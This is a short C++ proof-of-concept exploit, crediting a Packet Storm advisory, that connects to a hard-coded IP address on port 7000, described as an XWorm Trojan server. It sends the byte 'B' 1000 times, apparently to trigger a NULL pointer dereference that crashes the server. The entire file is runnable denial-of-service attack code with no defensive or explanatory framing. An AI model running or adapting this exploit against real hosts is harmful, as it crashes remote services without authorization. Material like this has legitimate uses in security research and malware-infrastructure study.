//PoC Reference : https://packetstormsecurity.com/files/170981/XWorm-Trojan-2.1-NULL-Pointer-Dereference.html
// Contact : https://twitter.com/vxremalware

#include <iostream>
#include <winsock2.h>

#pragma comment(lib, "Ws2_32.lib")

#pragma warning(disable: 4996)

#define _WINSOCK_DEPRECATED_NO_WARNINGS
int main() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in addr;

    // Initialize Winsock
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup failed with error: " << iResult << std::endl;
        return 1;
    }

    // Set up remote host IP and port
    const char* RHOST = "192.168.32.137"; //IP address of the Trojan Server 
    const int RPORT = 7000; //Port Used for remote Connection

    // Create a socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "socket failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Set up the address to connect to
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(RHOST);
    addr.sin_port = htons(RPORT);

    // Connect to the remote host
    iResult = connect(sock, (sockaddr*)&addr, sizeof(addr));
    if (iResult == SOCKET_ERROR) {
        std::cerr << "connect failed with error: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    const char* buf = "B";
    for (int i = 0; i < 1000; i++) {
        send(sock, buf, strlen(buf), 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
